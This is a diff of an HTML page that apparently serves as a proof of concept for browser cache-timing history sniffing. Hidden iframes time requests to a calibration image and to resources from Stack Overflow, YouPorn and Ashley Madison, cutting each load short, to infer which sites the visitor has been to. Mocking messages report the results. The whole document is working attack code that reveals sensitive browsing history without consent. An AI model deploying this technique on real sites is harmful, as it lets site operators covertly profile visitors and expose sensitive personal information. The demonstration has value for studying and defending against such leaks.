@@ -1,27 +1,172 @@
 <html>
-    <script src="https://code.jquery.com/jquery-2.1.1.js"></script>
+    <img src="/spy.svg" style="display:none"> 
+    <!-- We load this upon arrival on the page so that we can be certain it's
+         cached. Later, we time how long it takes to load it and use that as a
+         base for how long it should take to serve something from the cache. -->
+         
+    <div id="messages"></div>
+         
     <script>
-        function iframeLoaded () {
-            var $iframe = $('iframe'),
-                $iframeHtml = $($('iframe')[0].contentWindow.document);
+        var messages = document.getElementById('messages');
         
-            
-            $iframeHtml.find('body').append('<div class="post-text"></div>');
-            $iframeHtml.find('head').append(
-                '<link rel="stylesheet"  href="http://cdn.sstatic.net/stackoverflow/all.css?v=f2c7f2aa5fe9">'
-            );
-            setTimeout(function () {
-                console.log($iframeHtml.find('.post-text').css('width'));
-                if ($iframeHtml.find('.post-text').css('width') == "660px") {
-                    console.log("User has previously visited stack overflow");
+        function writeMessage(text) {
+            messageDiv = document.createElement('div');
+            messageDiv.textContent = text;
+            messages.appendChild(messageDiv);
+        }
+        
+        var checkIfCached = function () {
+            // We test each URL in series, rather than in parallel, because
+            // doing lots of tests in parallel screws up the timing - later
+            // responses get delayed waiting for earlier ones.
+            var queuedRequests = [],
+                testingNow = false, 
+                knownCacheHitTime,  
+                timeout;
+                                    
+                                     
+            determineKnownCacheHitTimeThenHandleQueue();
+                                     
+            return function (url, yesCallback, noCallback) {
+                if (testingNow || knownCacheHitTime == null) {
+                    queuedRequests.push(arguments);
                 }
                 else {
-                    console.log("User ain't never visited stack overflow");
+                    _getResponseTime(url, function (responseTime) {
+                        if (responseTime == timeout) {
+                            if (noCallback) noCallback(responseTime);
+                        }
+                        else {
+                            if (yesCallback) yesCallback(responseTime);
+                        }
+                    })
                 }
-                $iframeHtml.find('link').remove();
-                $iframe.remove();
-            }, 20);
-        }
+                
+            }
+            
+            function _getResponseTime (url, callback) {
+                var iframe = document.createElement('iframe'),
+                    img = document.createElement('img'),
+                    haveCalledCallback,
+                    startTime,
+                    timedOut = false;
+                    
+                testingNow = true;
+                
+                iframe.addEventListener('load', function () {
+                    startTime = new Date().getTime();
+                    
+                    img.addEventListener('error', gotResponse);
+                    img.addEventListener('load', gotResponse);
+                    img.src = url;
+                    iframe.contentDocument.body.appendChild(img);
+                    
+                    if (timeout != null) {
+                        setTimeout(function () {
+                            timedOut = true;
+                            gotResponse();
+                        }, timeout);
+                    }
+                });
+                iframe.style.display = 'none';
+                iframe.src="/empty_iframe.html";
+                document.body.appendChild(iframe);
+                
+                function gotResponse () {
+                    var endTime, requestTime;
+                    
+                    if (iframe.parentNode) {
+                        // Cancel the request to the img's target, so that we
+                        // don't end up caching it and screwing up our attempts
+                        // to check if it's cached on future page loads. Just
+                        // removing the img from the DOM isn't sufficient to do
+                        // this (in Chrome, at least), but removing a containing
+                        // iframe is. Just to be sure, let's do everything that
+                        // could conceivably stop the request.
+                        iframe.contentWindow.stop();
+                        window.stop();
+                        iframe.parentNode.removeChild(iframe);
+                    }
+                    
+                    if (timedOut) {
+                        var requestTime = timeout;
+                    }
+                    else {
+                        endTime = new Date().getTime(),
+                        requestTime = endTime - startTime;
+                    }
+                        
+                    if (callback && !haveCalledCallback) {
+                        console.log("It took " + (timedOut ? "more than " : "") + requestTime + " millis to get the response from " + url + ".");
+                        
+                        haveCalledCallback = true;
+                        callback(requestTime);
+                        testingNow = false;
+                        if (queuedRequests.length > 0) {
+                            checkIfCached.apply(null, queuedRequests.shift());
+                        }
+                    }
+                }
+            }
+            
+            function determineKnownCacheHitTimeThenHandleQueue () {
+                window.addEventListener('load', function () {
+                    setTimeout(function () {
+                        _getResponseTime('/spy.svg', function (time) {
+                            knownCacheHitTime = time;
+                            
+                            // Ideally we want the timeout to be such that cache
+                            // hits will always take less than `timeout`
+                            // milliseconds and cache misses will always take
+                            // more. This number is my totally non-rigorous
+                            // guesstimate of a a reasonable timeout.
+                            //
+                            // On some browsers (notably, Chrome) it would
+                            // actually be better to set this to 0 - the onload
+                            // handler will reliably still fire if the target is
+                            // cached - but for Firefox that won't work.
+                            timeout = Math.ceil(knownCacheHitTime*1.1 + 3);
+                            
+                            writeMessage("A request for a known cached resource took " + time + " milliseconds.");
+                            writeMessage("Setting the timeout threshold to " + timeout + " milliseconds. If a request takes longer than this, we will assume that the target resource was not cached; otherwise, we will assume it was cached.");
+                        });
+                    }, 50);
+                });
+            }
+        }();
+        
+        writeMessage("Are you a programmer? Let's check if you've visited Stack Overflow.");
+        checkIfCached(
+            "http://cdn.sstatic.net/img/favicons-sprite32.png?v=1ee265c3db1505c71feeb1afda065661",
+            function yes(responseTime) {
+                writeMessage("HIT! Got response from http://cdn.sstatic.net/img/favicons-sprite32.png?v=1ee265c3db1505c71feeb1afda065661 - the favicon for Stack Overflow - in only " + responseTime + "ms. Looks like you're a professional programmer - we'll target our advertising accordingly.");
+            },
+            function no() {
+                writeMessage("MISS! Request to http://cdn.sstatic.net/img/favicons-sprite32.png?v=1ee265c3db1505c71feeb1afda065661 - the favicon of programmer Q&A website Stack Overflow - went beyond the timeout. Looks like you're not a programmer.");
+            }
+        );
+        
+        writeMessage("Are you a porn viewer? Let's check if you've visited YouPorn.");
+        checkIfCached(
+            "http://cdn1.static.youporn.phncdn.com/cb/bundles/youpornwebfront/images/Adblock_detected.png",
+            function yes(responseTime) {
+                writeMessage("HIT! Got a response in " + responseTime + "ms from http://cdn1.static.youporn.phncdn.com/cb/bundles/youpornwebfront/images/Adblock_detected.png. Looks like you're a dirty, dirty porn user. We'll tell all your friends.");
+            },
+            function no() {
+                writeMessage("MISS! Timeout requesting http://cdn1.static.youporn.phncdn.com/cb/bundles/youpornwebfront/images/Adblock_detected.png - looks like you don't visit youporn.com.");
+            }
+        );
+        
+        writeMessage("Are you cheating on your partner? Let's see if you've visited Ashley Madison, the married dating website.");
+        checkIfCached(
+            "https://static-cdn.ashleymadison.com/v4/build/images/landing_hero_bg.2463b47a.jpg",
+            function yes(responseTime) {
+                writeMessage("HIT! Only " + responseTime + "ms to get a response from https://static-cdn.ashleymadison.com/v4/build/images/landing_hero_bg.2463b47a.jpg - the landing image of Ashley Madison. Does your partner know?");
+            },
+            function no() {
+                writeMessage("MISS! Timeout requesting https://static-cdn.ashleymadison.com/v4/build/images/landing_hero_bg.2463b47a.jpg, the landing image of cheaters' dating site Ashley Madison. Perhaps you're honest or single.");
+            }
+        );
+        
     </script>
-    <iframe src="iframe.html" onload="iframeLoaded()"><iframe>
 </html>
